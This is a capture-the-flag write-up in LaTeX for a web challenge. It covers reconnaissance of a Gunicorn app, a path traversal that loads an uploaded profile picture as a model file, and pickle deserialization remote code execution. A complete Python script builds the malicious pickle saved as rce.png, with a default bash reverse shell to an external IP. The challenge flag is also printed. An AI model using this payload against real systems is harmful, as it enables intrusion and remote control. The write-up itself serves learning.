\section{Intro}
The oracle is using \textbf{models} and algorithms to predict how you will
perform in CTFs in the future! Please choose a CTF and the total points you
made in the last three years.

\section{Solution}\label{hv22.35solution}

\begin{fullwidth}
First some intelligence gathered using Postman and the development mode of the browser:

\begin{itemize}
\item the server is Gunicorn, so we are probably dealing with python
\item we can upload a profile picture that is then stored in \verb+/tmp/...+
\item the oracle itself has two inputs in the POST method: the CTF and the
	scores
\item entering more than three scores returns just predicted values for all
	submitted values
\item changing the CTF to another value, \emph{e.g.} \texttt{HackyEaster}, triggers a
	message about {\small\texttt{... cannot load file ./model/HackyEaster}}
\item injecting wildcards etc. do not seem to have an effect
\item we can traverse the directory tree: {\small\texttt{../../../tmp/../app/models/HE}}
	does get us the proper HE model
\end{itemize}

\noindent 
Reading up on the way to store ML-models, it became likely that we can store
pickled models that are then loaded.  The plan of attack is thus to create a
pickled payload stored as \verb+rce.png+, store this file as a profile picture,
and load this file as the model.  Then the server will load the model, unpickle
it and execute our payload.

Creating a first remote shell using a simple netcat listener didn't give a
shell, but at least a new error message: {\small\texttt{Failed to make prediction}}.
This means that the pickle was loaded successfully, but did not continue
running for whatever reason.  Later it became clear that \verb+nc+ is not
available on the server.  

After trying many different routes to get something to work (a python shell, a
listener, ...) finally a very simpe reverse shell using \verb+bash+ worked
beautifully in connecting via ngrok -- but to do this, I first had to learn
about ngrok.  The final scrip to create the payload looks like this: 
\end{fullwidth}

\newpage
{\small
\begin{minted}{python}
#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.

import pickle
import sys
DEFAULT_COMMAND="/bin/bash -c '/bin/sh -i >& /dev/tcp/3.68.56.232/10421 0>&1'"
COMMAND = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_COMMAND

class PickleRce(object):
    def __reduce__(self):
        import os
        return (os.system,(COMMAND,))

with open('rce.png', 'wb') as outF:
    outF.write(pickle.dumps(PickleRce()))
\end{minted}
}

\noindent\verb+cd+ up one directory from where the shell spawns, we find the file \verb+flag.txt+ with the contents \verb+he2022{ef453cc6-46eb-4c86-87df-cf34a6d2e3d8}+
